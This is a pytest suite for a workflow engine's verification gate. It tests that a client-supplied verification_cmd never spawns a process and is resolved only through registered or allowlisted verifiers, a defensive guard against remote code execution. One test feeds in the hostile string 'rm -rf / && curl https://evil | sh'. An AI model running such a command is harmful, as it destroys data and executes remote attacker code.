"""Honest execution of a node's declared ``verification_cmd``.

Honesty pins in this suite:

* **a declared verifier is actually executed** — before, nothing in
  ``alpha.workflow`` read ``config["verification_cmd"]`` at all, so a run could
  succeed while its own plan named a check that never ran;
* **an unresolvable declaration FAILS the node** rather than being dropped, so
  a typo can never quietly turn into "no gate";
* **an unrunnable declaration is disclosed as ``not_run``, never as a pass** —
  mirroring the compensation contract, where no callback bound means
  ``executed: False`` and the node still completes;
* **the engine never spawns a process itself.** ``verification_cmd`` is
  reachable from ``POST /api/workflows`` (``body.graph``) and from
  ``update_node_config``, so it is *client-supplied input*; shelling out here
  would be authenticated RCE. Execution only ever reaches a host-registered
  verifier, an ``alpha.``-prefixed dotted path, or a host-bound executor;
* **a verifier that says no blocks completion**, and the reason that lands in
  the node output is the verifier's own text, not an invented one.
"""

from __future__ import annotations

import importlib
import os
import subprocess
import sys
import types

import pytest

from alpha.workflow.dynamic_assembler import AssembledResources
from alpha.workflow.dynamic_bridge import DynamicWorkflowBridge
from alpha.workflow.dynamic_decomposer import DynamicDecomposer
from alpha.workflow.dynamic_perception import DynamicPerceptionEngine
from alpha.workflow.leases import LeaseManager
from alpha.workflow.models import NodeStatus, NodeType, WorkflowDefinition, WorkflowGraph, WorkflowNode
from alpha.workflow.runtime import DynamicWorkflowEngine
from alpha.workflow.verification import (
    VerificationOutcome,
    VerificationStatus,
    declared_command,
    run_verification,
)

PROBE = "alpha._wf_verification_probe"


# --------------------------------------------------------------------- helpers


def _probe(monkeypatch, **attrs) -> types.ModuleType:
    """Install a fake ``alpha.*`` module so a dotted path has something to find."""
    module = types.ModuleType(PROBE)
    for name, value in attrs.items():
        setattr(module, name, value)
    monkeypatch.setitem(sys.modules, PROBE, module)
    return module


def _engine(tmp_path, monkeypatch) -> DynamicWorkflowEngine:
    monkeypatch.setenv("ALPHA_HOME", str(tmp_path))
    engine = DynamicWorkflowEngine()
    engine.leases = LeaseManager(tmp_path / "leases")
    return engine


def _definition(wf_id: str, verification_cmd: str | None) -> WorkflowDefinition:
    node = WorkflowNode(id="n1")
    if verification_cmd is not None:
        node.config["verification_cmd"] = verification_cmd
    graph = WorkflowGraph(version=1, nodes={"n1": node}, edges=[])
    return WorkflowDefinition(id=wf_id, name=wf_id, graph=graph)


def _runner(node, run):  # noqa: ANN001 - mirrors the engine's seam signature
    return {"status": "completed", "output": f"ran:{node.id}", "evidence": f"evidence:{node.id}"}


# ------------------------------------------------------------- declaration


class TestDeclaration:
    def test_absent_command_is_not_declared(self) -> None:
        assert declared_command({}) is None
        assert declared_command({"verification_cmd": None}) is None

    def test_blank_command_is_not_declared(self) -> None:
        assert declared_command({"verification_cmd": "   \n\t "}) is None

    def test_non_string_declaration_is_not_declared(self) -> None:
        # A list/dict/number is not a command; accepting it would mean guessing.
        assert declared_command({"verification_cmd": ["pytest", "-q"]}) is None
        assert declared_command({"verification_cmd": 42}) is None

    def test_a_real_declaration_is_returned_trimmed(self) -> None:
        assert declared_command({"verification_cmd": "  pytest -q "}) == "pytest -q"

    def test_undeclared_is_never_blocking(self) -> None:
        outcome = run_verification(None)
        assert outcome.status is VerificationStatus.NOT_DECLARED
        assert outcome.declared is False
        assert outcome.blocks_completion is False
        assert outcome.evidence is None


# ------------------------------------------------------- registry execution


class TestRegistryExecution:
    def test_registered_verifier_returning_true_passes(self) -> None:
        outcome = run_verification("quality_gate", registry={"quality_gate": lambda: True})
        assert outcome.status is VerificationStatus.PASSED
        assert outcome.resolved_via == "registry"
        assert outcome.blocks_completion is False
        assert outcome.evidence is not None and "quality_gate" in outcome.evidence
        assert outcome.duration_ms is not None

    def test_registered_verifier_returning_false_fails_and_blocks(self) -> None:
        outcome = run_verification("quality_gate", registry={"quality_gate": lambda: False})
        assert outcome.status is VerificationStatus.FAILED
        assert outcome.blocks_completion is True

    def test_a_verifier_that_raises_is_not_run_and_does_not_block(self) -> None:
        # No verdict was obtained, so nothing may claim one — but the node is
        # not punished for a verifier it could not invoke.
        def boom() -> bool:
            raise ValueError("verifier exploded")

        outcome = run_verification("boom", registry={"boom": boom})
        assert outcome.status is VerificationStatus.NOT_RUN
        assert outcome.blocks_completion is False
        assert "ValueError: verifier exploded" in outcome.reason

    def test_registry_is_consulted_before_any_dotted_import(self, monkeypatch) -> None:
        imported: list[str] = []
        real_import = importlib.import_module

        def spy(name: str):  # noqa: ANN001
            imported.append(name)
            return real_import(name)

        monkeypatch.setattr(importlib, "import_module", spy)
        _probe(monkeypatch, check=lambda: False)
        # Same dotted text is in the registry, so the import must not happen.
        outcome = run_verification(f"{PROBE}.check", registry={f"{PROBE}.check": lambda: True})
        assert outcome.status is VerificationStatus.PASSED
        assert imported == []


# ------------------------------------------------- dotted-path resolution


class TestDottedResolution:
    def test_alpha_dotted_verifier_is_imported_invoked_and_passes(self, monkeypatch) -> None:
        _probe(monkeypatch, always_passes=lambda: True)
        outcome = run_verification(f"{PROBE}.always_passes")
        assert outcome.status is VerificationStatus.PASSED
        assert outcome.resolved_via == "dotted"

    def test_alpha_dotted_verifier_returning_false_blocks(self, monkeypatch) -> None:
        _probe(monkeypatch, always_fails=lambda: False)
        outcome = run_verification(f"{PROBE}.always_fails")
        assert outcome.status is VerificationStatus.FAILED
        assert outcome.blocks_completion is True

    def test_a_dotted_path_outside_alpha_is_refused_and_never_imported(self, monkeypatch) -> None:
        # The RCE pin: ``os.system`` and friends are not importable as verifiers.
        monkeypatch.setattr(
            importlib,
            "import_module",
            lambda *_a, **_k: pytest.fail("a path outside the allowlisted prefix must never be imported"),
        )
        outcome = run_verification("os.system")
        assert outcome.status is VerificationStatus.UNRESOLVED
        assert outcome.blocks_completion is True
        assert outcome.resolved_via is None
        assert "alpha." in outcome.reason

    def test_an_unimportable_alpha_path_is_unresolved(self) -> None:
        outcome = run_verification("alpha._definitely_absent_module_xyz.check")
        assert outcome.status is VerificationStatus.UNRESOLVED
        assert outcome.blocks_completion is True
        assert "alpha._definitely_absent_module_xyz" in outcome.reason

    def test_a_dotted_path_resolving_to_a_constant_is_unresolved(self, monkeypatch) -> None:
        _probe(monkeypatch, NOT_CALLABLE=42)
        outcome = run_verification(f"{PROBE}.NOT_CALLABLE")
        assert outcome.status is VerificationStatus.UNRESOLVED
        assert "not callable" in outcome.reason

    def test_a_bare_symbol_that_is_not_registered_is_unresolved(self) -> None:
        # The decomposer used to emit exactly this shape (``verify_memory_persistence``),
        # naming a function that does not exist anywhere in the tree.
        outcome = run_verification("verify_memory_persistence")
        assert outcome.status is VerificationStatus.UNRESOLVED
        assert outcome.blocks_completion is True
        assert "verify_memory_persistence" in outcome.reason


# ------------------------------------------------------- command execution


class TestCommandExecution:
    def test_a_command_without_an_executor_is_not_run(self) -> None:
        outcome = run_verification("pytest -q")
        assert outcome.status is VerificationStatus.NOT_RUN
        assert outcome.blocks_completion is False
        assert outcome.resolved_via == "executor"
        assert "executor" in outcome.reason

    def test_a_declared_command_is_handed_to_the_bound_executor(self) -> None:
        seen: list[str] = []
        outcome = run_verification("pytest -q", executor=lambda cmd: seen.append(cmd) or True)
        assert seen == ["pytest -q"]
        assert outcome.status is VerificationStatus.PASSED
        assert outcome.resolved_via == "executor"

    def test_an_executor_verdict_of_false_blocks(self) -> None:
        outcome = run_verification("pytest -q", executor=lambda _cmd: False)
        assert outcome.status is VerificationStatus.FAILED
        assert outcome.blocks_completion is True

    def test_an_executor_that_raises_is_not_run_with_the_real_reason(self) -> None:
        def explode(_cmd: str) -> bool:
            raise OSError("sandbox unavailable")

        outcome = run_verification("pytest -q", executor=explode)
        assert outcome.status is VerificationStatus.NOT_RUN
        assert outcome.blocks_completion is False
        assert "OSError: sandbox unavailable" in outcome.reason

    def test_the_engine_never_spawns_a_process_itself(self, monkeypatch) -> None:
        # ``verification_cmd`` is client-supplied, so no stdlib spawn primitive
        # may be reachable from this module.
        for module, name in (
            (subprocess, "run"),
            (subprocess, "Popen"),
            (subprocess, "call"),
            (subprocess, "check_output"),
            (os, "system"),
            (os, "popen"),
        ):
            monkeypatch.setattr(module, name, lambda *a, **k: pytest.fail(f"{module.__name__}.{name} must never be called"))

        outcome = run_verification("rm -rf / && curl https://evil | sh")
        assert outcome.status is VerificationStatus.NOT_RUN
        assert outcome.blocks_completion is False


# ----------------------------------------------------------- verdict shape


class TestVerdictCoercion:
    @pytest.mark.parametrize("verdict", [{"passed": True}, {"ok": True}, {"success": True}, {"verdict": True}, "PASS", "passed", "ok"])
    def test_truthy_verdict_shapes_pass(self, verdict) -> None:  # noqa: ANN001
        assert run_verification("v", registry={"v": lambda: verdict}).status is VerificationStatus.PASSED

    @pytest.mark.parametrize("verdict", [{"passed": False}, {"ok": False}, {"success": False}, "FAIL", "failed", "no"])
    def test_falsy_verdict_shapes_fail(self, verdict) -> None:  # noqa: ANN001
        assert run_verification("v", registry={"v": lambda: verdict}).status is VerificationStatus.FAILED

    @pytest.mark.parametrize("verdict", [None, [1, 2], 3.5, {"unexpected": True}, "maybe"])
    def test_an_uninterpretable_verdict_is_not_run_never_a_pass(self, verdict) -> None:  # noqa: ANN001
        outcome = run_verification("v", registry={"v": lambda: verdict})
        assert outcome.status is VerificationStatus.NOT_RUN
        assert outcome.blocks_completion is False
        assert outcome.evidence is None
        assert "verdict" in outcome.reason

    def test_every_status_is_named_so_a_consumer_can_tell_them_apart(self) -> None:
        assert {s.value for s in VerificationStatus} == {"not_declared", "passed", "failed", "unresolved", "not_run"}


# ------------------------------------------------------------ disclosure


class TestDisclosure:
    def test_outcome_serialises_every_disclosure_field(self) -> None:
        outcome = run_verification("v", registry={"v": lambda: True})
        payload = outcome.to_dict()
        assert payload == {
            "status": "passed",
            "command": "v",
            "reason": outcome.reason,
            "resolved_via": "registry",
            "evidence": outcome.evidence,
            "duration_ms": outcome.duration_ms,
        }

    def test_a_pass_is_the_only_status_carrying_evidence(self) -> None:
        assert run_verification("v", registry={"v": lambda: True}).evidence is not None
        assert run_verification("v", registry={"v": lambda: False}).evidence is None
        assert run_verification("v", registry={"v": lambda: None}).evidence is None
        assert run_verification("undeclared").evidence is None

    @pytest.mark.parametrize(
        ("status", "blocks"),
        [
            (VerificationStatus.NOT_DECLARED, False),
            (VerificationStatus.PASSED, False),
            (VerificationStatus.NOT_RUN, False),
            (VerificationStatus.FAILED, True),
            (VerificationStatus.UNRESOLVED, True),
        ],
    )
    def test_only_failed_and_unresolved_block_completion(self, status: VerificationStatus, blocks: bool) -> None:
        outcome = VerificationOutcome(status=status, command="v", reason="r")
        assert outcome.blocks_completion is blocks


# ----------------------------------------------------------- engine gating


class TestEngineGate:
    def test_a_failing_verifier_fails_the_node_with_the_verifier_s_reason(self, tmp_path, monkeypatch) -> None:
        engine = _engine(tmp_path, monkeypatch)
        engine.register_verifier("quality_gate", lambda: False)
        engine.register_definition(_definition("wf_gate_fail", "quality_gate"))
        run = engine.start_run("wf_gate_fail")
        engine.execute_step(run.run_id, node_runner=_runner)

        refreshed = engine.get_run(run.run_id)
        assert refreshed.failed_nodes == ["n1"]
        graph = engine._run_graphs[run.run_id]
        node = graph.nodes["n1"]
        assert node.status is NodeStatus.FAILED
        assert node.output["status"] == "failed"
        assert "verification failed" in node.output["reason"]
        assert node.output["verification"]["status"] == "failed"

    def test_an_unresolvable_verifier_fails_the_node(self, tmp_path, monkeypatch) -> None:
        engine = _engine(tmp_path, monkeypatch)
        engine.register_definition(_definition("wf_gate_unresolved", "check_that_does_not_exist"))
        run = engine.start_run("wf_gate_unresolved")
        engine.execute_step(run.run_id, node_runner=_runner)

        refreshed = engine.get_run(run.run_id)
        assert refreshed.failed_nodes == ["n1"]
        node = engine._run_graphs[run.run_id].nodes["n1"]
        assert node.output["verification"]["status"] == "unresolved"
        assert "check_that_does_not_exist" in node.output["reason"]

    def test_a_passing_verifier_succeeds_and_records_the_evidence(self, tmp_path, monkeypatch) -> None:
        engine = _engine(tmp_path, monkeypatch)
        engine.register_verifier("quality_gate", lambda: True)
        engine.register_definition(_definition("wf_gate_pass", "quality_gate"))
        run = engine.start_run("wf_gate_pass")
        engine.execute_step(run.run_id, node_runner=_runner)

        graph = engine._run_graphs[run.run_id]
        node = graph.nodes["n1"]
        assert node.status is NodeStatus.SUCCEEDED
        assert any("verification" in e and "quality_gate" in e for e in node.evidence), node.evidence

    def test_an_unrunnable_verifier_discloses_without_failing_the_node(self, tmp_path, monkeypatch) -> None:
        # No executor is bound here: exactly the compensation precedent of
        # ``executed: False`` on a node that still completes honestly.
        engine = _engine(tmp_path, monkeypatch)
        engine.register_definition(_definition("wf_gate_notrun", "pytest -q"))
        run = engine.start_run("wf_gate_notrun")

        seen: list[str] = []
        payloads: list[dict] = []
        engine.events.subscribe(lambda e: (seen.append(e.event_type), payloads.append(dict(e.payload))))
        try:
            engine.execute_step(run.run_id, node_runner=_runner)
        finally:
            engine.events.unsubscribe(lambda e: None)

        graph = engine._run_graphs[run.run_id]
        node = graph.nodes["n1"]
        assert node.status is NodeStatus.SUCCEEDED, "no executor bound must not fail the node"
        assert "node_verification" in seen, "an unrunnable verifier must be disclosed, not dropped"
        disclosed = next(p for p in payloads if p.get("status") == "not_run")
        assert disclosed["command"] == "pytest -q"
        assert "executor" in disclosed["reason"]
        assert disclosed["passed"] is False

    def test_a_node_without_a_verifier_emits_no_verification_event(self, tmp_path, monkeypatch) -> None:
        engine = _engine(tmp_path, monkeypatch)
        engine.register_verifier("quality_gate", lambda: False)
        engine.register_definition(_definition("wf_gate_absent", None))
        run = engine.start_run("wf_gate_absent")

        seen: list[str] = []
        listener = lambda e: seen.append(e.event_type)  # noqa: E731
        engine.events.subscribe(listener)
        try:
            engine.execute_step(run.run_id, node_runner=_runner)
        finally:
            engine.events.unsubscribe(listener)

        graph = engine._run_graphs[run.run_id]
        assert graph.nodes["n1"].status is NodeStatus.SUCCEEDED
        assert "node_verification" not in seen

    def test_a_gate_runs_against_the_attempt_that_produced_the_evidence(self, tmp_path, monkeypatch) -> None:
        # The runner succeeds, but the verifier refuses: execution success and
        # verification success are separate axes and the latter wins.
        engine = _engine(tmp_path, monkeypatch)
        engine.register_verifier("quality_gate", lambda: False)
        engine.register_definition(_definition("wf_gate_axes", "quality_gate"))
        run = engine.start_run("wf_gate_axes")
        engine.execute_step(run.run_id, node_runner=_runner)

        node = engine._run_graphs[run.run_id].nodes["n1"]
        assert node.status is NodeStatus.FAILED
        # The runner's own evidence must NOT be recorded as if it completed.
        assert node.evidence == [], node.evidence
        assert node.output["verification"]["status"] == "failed"


def test_outcome_type_is_frozen_and_reusable() -> None:
    outcome = VerificationOutcome(status=VerificationStatus.PASSED, command="v", reason="ok")
    assert outcome.declared is True
    assert outcome.resolved_via is None
    with pytest.raises(Exception):
        outcome.status = VerificationStatus.FAILED  # type: ignore[misc]


# ----------------------------------------------------------- bridge surface


def test_bridge_metadata_discloses_the_verification_seam_without_claiming_a_verdict(tmp_path, monkeypatch) -> None:
    """Execution acceptance and verification are separate axes, and stay separate.

    The stub runner completes every node, so ``acceptance_passed`` is True — yet
    no verifier is bound here, so nothing that was declared actually ran. The
    metadata has to let a consumer tell those two facts apart instead of
    presenting one merged "all good".
    """
    monkeypatch.setenv("ALPHA_HOME", str(tmp_path))
    prompt = "research the codebase, then plan and build the feature with tests"
    intent = DynamicPerceptionEngine().perceive(prompt)
    goal = DynamicDecomposer().decompose(intent, prompt)
    resources = AssembledResources(goal_id=goal.goal_id, tools=["read_file"])

    def stub_runner(node, run):  # noqa: ANN001 - mirrors the engine's seam signature
        return {"status": "completed", "output": {"ran": node.id}, "evidence": f"stub runner executed '{node.id}'"}

    result = DynamicWorkflowBridge(node_runner=stub_runner).execute_goal(goal, resources)

    assert result.status == "completed", result.error_summary
    verification = result.metadata["verification"]
    # Nothing can execute: the seam is host-bound and empty by default.
    assert verification["executor_bound"] is False
    assert verification["registered_verifiers"] == 0
    # Exactly one command is declared, and it is the one that really resolves.
    # This pins the removal of the six names the decomposer used to emit
    # (verify_research_coverage, ping_mcp_servers, validate_bot_roster_health,
    # verify_test_suite_and_orphans, verify_memory_persistence and the
    # argument-taking validate_skill_draft) — none of them is a runnable
    # zero-argument verifier, and an unresolvable declaration now FAILS the node.
    assert verification["declared_nodes"] == ["task_05_dynamic_implementation"]
    assert verification["outcomes_event_type"] == "node_verification"
    # The block is a posture, never a verdict: no status is asserted here.
    assert "passed" not in verification and "status" not in verification
    # ...while the execution axis still reports its own, honest result.
    assert result.metadata["acceptance_passed"] is True


# ------------------------------------------------------- disclosed scope edge


def test_a_structural_node_kind_does_not_execute_a_declared_verifier(tmp_path, monkeypatch) -> None:
    """Pin the disclosed scope of verification so the docs cannot over-claim it.

    ``verification_cmd`` executes on the default/agent/tool/bot path in
    ``_execute_single_node``. Kinds the runtime measures itself complete inside
    ``_handle_structural_node`` and return *before* that path, so a declaration
    on one of them is not executed at all. Recording that as a boundary — here
    and in the guides — is the alternative to silently implying coverage the
    engine does not have.
    """
    monkeypatch.setenv("ALPHA_HOME", str(tmp_path))
    engine = DynamicWorkflowEngine()
    engine.leases = LeaseManager(tmp_path / "leases")
    invoked: list[str] = []
    engine.register_verifier("quality_gate", lambda: invoked.append("called") or True)

    node = WorkflowNode(id="n1", type=NodeType.CHECKPOINT)
    node.config["verification_cmd"] = "quality_gate"
    engine.register_definition(WorkflowDefinition(id="wf_structural", name="wf_structural", graph=WorkflowGraph(version=1, nodes={"n1": node}, edges=[])))
    run = engine.start_run("wf_structural")

    seen: list[str] = []
    listener = lambda e: seen.append(e.event_type)  # noqa: E731
    engine.events.subscribe(listener)
    try:
        engine.execute_step(run.run_id, node_runner=_runner)
    finally:
        engine.events.unsubscribe(listener)

    graph = engine._run_graphs[run.run_id]
    # The checkpoint completes on its own measurement, as designed...
    assert graph.nodes["n1"].status is NodeStatus.SUCCEEDED
    # ...and the declared verifier is neither invoked nor given a verdict.
    assert invoked == [], "a kind that completes on its own measurement must not execute a declared verifier"
    assert "node_verification" not in seen
